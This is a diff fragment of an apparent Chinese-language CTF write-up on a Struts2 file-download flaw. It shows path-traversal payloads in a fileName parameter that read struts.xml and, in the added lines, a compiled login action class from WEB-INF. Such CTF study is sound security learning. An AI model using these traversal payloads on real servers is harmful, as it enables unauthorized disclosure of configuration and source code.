@@ -31,4 +31,8 @@ struts.xml是struts2的核心配置文件，在开发过程中利用率最高。
 ```
 ?fileName=../../WEB-INF/classes/struts.xml
 ```
+同样根据映射下载
+```
+?fileName=../../WEB-INF/classes/com/cuitctf/action/UserLoginAction.class
+```
 
